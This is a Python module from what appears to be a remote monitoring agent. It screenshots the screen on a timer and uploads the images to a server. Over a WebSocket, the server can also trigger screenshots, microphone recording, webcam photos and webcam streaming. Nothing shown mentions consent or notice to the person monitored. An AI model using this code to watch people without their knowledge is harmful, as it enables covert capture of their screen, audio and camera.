"""
Захват экрана.

Два режима:
1. Периодический (таймер) — каждые SCREENSHOT_INTERVAL секунд.
2. Триггерный — сервер шлёт WS-команду {"type":"take_screenshot","agent_id":"..."}.
"""
import io
import json
import logging
import threading
import time

import mss
from PIL import Image

from config import (
    SERVER_URL, AGENT_TOKEN,
    SCREENSHOT_INTERVAL, SCREENSHOT_QUALITY, SCREENSHOT_MAX_W,
)

log = logging.getLogger("screenshot")

_WS_RECONNECT = 10   # сек между попытками переподключения WS


class ScreenshotCapture:
    def __init__(self, sender, interval: int | None = None, quality: int | None = None, max_w: int | None = None,
                 mic_collector=None, webcam_collector=None):
        self._sender     = sender
        self._trigger    = threading.Event()  # взводится при получении команды
        # Настройки: приоритет у серверного конфига, иначе — значения из config.py
        self._interval = interval if interval is not None else SCREENSHOT_INTERVAL
        self._quality  = quality  if quality  is not None else SCREENSHOT_QUALITY
        self._max_w    = max_w    if max_w    is not None else SCREENSHOT_MAX_W

        # Ссылки на другие коллекторы для триггерных команд через один WS
        self._mic_collector = mic_collector
        self._webcam_collector = webcam_collector

    # ── Публичный метод: делает один снимок по запросу ────────────────────────
    def take_now(self) -> None:
        try:
            self._capture_and_upload()
            log.info("Triggered screenshot uploaded")
        except Exception as e:
            log.error("Triggered screenshot error: %s", e)

    # ── Периодический поток ───────────────────────────────────────────────────
    def run(self) -> None:
        # Запускаем WS-слушатель в отдельном потоке
        threading.Thread(
            target=self._ws_listener,
            daemon=True,
            name="screenshot-ws",
        ).start()

        while True:
            try:
                self._capture_and_upload()
            except Exception as e:
                log.error("Screenshot error: %s", e)
            # Ждём таймер ИЛИ триггер (кто наступит первым)
            self._trigger.wait(timeout=self._interval)
            self._trigger.clear()

    # ── WebSocket-слушатель команд от сервера ─────────────────────────────────
    def _ws_listener(self) -> None:
        import websocket  # websocket-client

        agent_id = self._sender.agent_id
        ws_url   = SERVER_URL.replace("http://", "ws://").replace("https://", "wss://")
        ws_url   = f"{ws_url}/ws"

        while True:
            try:
                ws = websocket.create_connection(
                    ws_url,
                    timeout=30,
                    header={"X-Agent-Token": AGENT_TOKEN},
                )
                log.info("Screenshot WS connected")
                while True:
                    raw = ws.recv()
                    if not raw:
                        continue
                    try:
                        msg = json.loads(raw)
                        msg_type = msg.get("type", "")
                        msg_agent = msg.get("agent_id", "")

                        if msg_agent != agent_id:
                            continue

                        # ── Скриншот ──────────────────────────────────────
                        if msg_type == "take_screenshot":
                            log.info("Trigger screenshot command received")
                            self._trigger.set()

                        # ── Микрофон ──────────────────────────────────────
                        elif msg_type == "start_recording" and self._mic_collector:
                            log.info("Start recording command received")
                            self._mic_collector.start_continuous()

                        elif msg_type == "stop_recording" and self._mic_collector:
                            log.info("Stop recording command received")
                            self._mic_collector.stop_continuous()

                        elif msg_type == "take_recording" and self._mic_collector:
                            log.info("Take single recording command received")
                            threading.Thread(
                                target=self._mic_collector.take_now,
                                daemon=True,
                            ).start()

                        # ── Веб-камера ────────────────────────────────────
                        elif msg_type == "take_webcam" and self._webcam_collector:
                            log.info("Take webcam photo command received")
                            threading.Thread(
                                target=self._webcam_collector.take_now,
                                daemon=True,
                            ).start()

                        elif msg_type == "start_webcam_stream" and self._webcam_collector:
                            log.info("Start webcam stream command received")
                            self._webcam_collector.start_stream()

                        elif msg_type == "stop_webcam_stream" and self._webcam_collector:
                            log.info("Stop webcam stream command received")
                            self._webcam_collector.stop_stream()

                    except Exception:
                        pass
            except Exception as e:
                log.debug("Screenshot WS error: %s — reconnecting in %ds", e, _WS_RECONNECT)
                time.sleep(_WS_RECONNECT)


    # ── Захват и загрузка ─────────────────────────────────────────────────────
    def _capture_and_upload(self) -> None:
        with mss.mss() as sct:
            monitor = sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0]
            raw = sct.grab(monitor)

        img = Image.frombytes("RGB", raw.size, raw.bgra, "raw", "BGRX")

        if img.width > self._max_w:
            ratio = self._max_w / img.width
            img = img.resize(
                (self._max_w, int(img.height * ratio)),
                Image.LANCZOS,
            )

        buf = io.BytesIO()
        img.save(buf, format="JPEG", quality=self._quality, optimize=True)
        self._sender.upload_screenshot(buf.getvalue())
